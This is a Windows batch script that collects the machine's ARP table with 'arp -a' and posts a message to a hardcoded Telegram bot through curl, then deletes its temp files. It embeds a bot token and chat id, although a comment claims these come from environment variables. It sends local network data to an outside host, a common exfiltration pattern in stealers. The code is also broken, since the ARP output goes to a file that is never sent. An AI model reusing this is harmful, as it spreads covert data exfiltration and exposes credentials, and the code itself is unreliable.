@echo off
cls

rem Run arp -a command and save the output to a temporary file
arp -a > arp_output.txt

rem Read the token and chat_id from the environment variables
set "bot_token=6437042384:AAE1yzevUXLrfX7aE01MB5rsbUG57gWpM8w"
set "chat_id=1537642691"

rem Prepare the message with the content of arp_output.txt
set "message=Network MAC Addresses:%0A%0A"
type arp_output.txt >> message.txt

rem Use curl to send a message to the Telegram Bot API
curl -s -X POST https://api.telegram.org/bot%bot_token%/sendMessage -d parse_mode=Markdown -d chat_id=%chat_id% -d text=%message%

rem Cleanup: Delete temporary files
del arp_output.txt
del message.txt

echo.
pause
